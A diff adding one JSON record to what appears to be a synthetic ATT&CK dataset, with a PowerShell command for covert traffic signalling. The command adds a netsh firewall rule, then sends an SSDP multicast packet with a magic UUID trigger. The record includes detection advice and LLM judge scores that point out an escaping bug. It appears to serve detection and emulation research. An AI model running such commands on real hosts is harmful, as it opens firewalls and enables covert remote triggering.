@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall firewall add rule name='SSDP-Signal' dir=out action=allow protocol=UDP remoteport=1900 remoteip=239.255.255.250 >$null;$u=New-Object System.Net.Sockets.UdpClient;$data='M-SEARCH * HTTP/1.1`r`nHOST: 239.255.255.250:1900`r`nST: uuid:deadbeef-dead-beef-dead-beefdeadbeef`r`nMAN: \"ssdp:discover\"`r`nMX: 1`r`n`r`n';$bytes=[Text.Encoding]::ASCII.GetBytes($data);$u.Send($bytes,$bytes.Length,'239.255.255.250',1900)|Out-Null",
+  "explanation": "Transmits a multicast SSDP M-SEARCH request with a magic UUID in the ST header, enabling remote listeners to treat it as a covert trigger. Uses netsh to allow outbound UDP/1900 to the SSDP multicast address.",
+  "rationale_steps": [
+    "Craft a SSDP discovery message embedding a unique magic token in the ST field.",
+    "Allow and send multicast UDP/1900 traffic for signaling.",
+    "Detection: monitor outbound SSDP from servers, inspect unusual ST values, and detect netsh-created rules permitting multicast on non-UM H devices."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-00bead39",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes and parentheses, valid separators, and correctly structured netsh and UdpClient calls.",
+        "semantic_score": 4,
+        "semantic_justification": "It sends a UDP datagram to the SSDP multicast address with the intended magic ST value (traffic signaling), though the CRLF escapes in a single-quoted string and lack of admin rights for the firewall rule may impede exact SSDP formatting and rule application.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:24:38.473678Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with valid semicolon separators, balanced quotes, and correct method calls, though the backtick-r-backtick-n sequences (`r`n) inside single-quoted strings won't be interpreted as CRLF in PowerShell (single quotes suppress escape processing), which is a functional but not strictly syntactic issue.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 Traffic Signaling by embedding a magic UUID in the SSDP ST header of a multicast UDP packet to serve as a covert trigger, uses netsh to pre-authorize the outbound firewall rule, and leverages a legitimate-looking SSDP M-SEARCH format to blend with normal UPnP discovery traffic — all consistent with the described technique.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T03:52:05.189881Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed PowerShell, correctly using the call operator, semi-colon separators, and proper .NET class instantiation/method calls.",
+        "semantic_score": 4,
+        "semantic_justification": "While the logic for traffic signaling via SSDP is sound, the use of single quotes in PowerShell prevents the expansion of the backtick escape sequences (`r`n), resulting in a packet with literal backticks instead of actual carriage returns, and the netsh command requires administrative privileges.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:52:16.375258Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
